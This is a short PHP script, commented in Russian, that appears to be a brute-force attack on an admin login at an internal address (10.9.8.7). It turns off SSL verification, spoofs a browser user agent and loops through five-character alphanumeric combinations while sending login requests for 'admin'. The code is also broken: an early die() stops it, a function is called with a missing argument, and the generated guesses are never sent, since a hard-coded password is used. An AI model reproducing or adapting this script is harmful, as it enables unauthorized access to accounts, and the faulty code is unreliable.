
<?php
ini_set('error_reporting', 1);
ini_set('display_errors', 1);
function currl($link, $param){
  usleep(334000);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $link);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0); // отключить валидацию ssl
  curl_setopt ($ch,CURLOPT_SSLVERSION, 3);
	curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3');
	curl_setopt ($ch, CURLOPT_HTTPHEADER, array('Expect:')); // это необходимо, чтобы cURL не высылал заголовок на ожидание
	if($PROXY)curl_setopt($ch, CURLOPT_PROXY, $PROXY); // Прокси сервер если есть
	curl_setopt($ch, CURLOPT_POSTFIELDS, $param); // Данные для отправки
	//curl_setopt($ch, CURLOPT_HEADER, 0); // Не возвращать заголовки
	$data = curl_exec($ch); // Выполняем запрос
	curl_close($ch); // Закрываем соединение
	return json_decode($data,true); // Парсим JSON и отдаем

}
$convertedText = currl("https://10.9.8.7/user");
die($convertedText);
$b_m = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");
for($a=0;$a!=count($b_m);$a++){
  $a=$b_m[$a];
  for($aa=0;$aa!=count($b_m);$aa++){
    $b= $a.$b_m[$aa];
    for($aaa=0;$aaa!=count($b_m);$aaa++){
      $c= $b.$b_m[$aaa];
    for($aaaa=0;$aaaa!=count($b_m);$aaaa++){
      $d= $c.$b_m[$aaaa];
      for($aaaaa=0;$aaaaa!=count($b_m);$aaaaa++){
        $e= $d.$b_m[$aaaaa];
        $pass = file_get_contents("https://10.9.8.7/user/user.php?act=4&login=admin&pswd=kaktak&login_b=-%3DENTER%3D-");
        echo $pass;
        if($pass){
       echo "\n$e -- ".$pass;
        }else{
       //echo "\n$e";
     }
      }
    }
    }
  }
}
?>
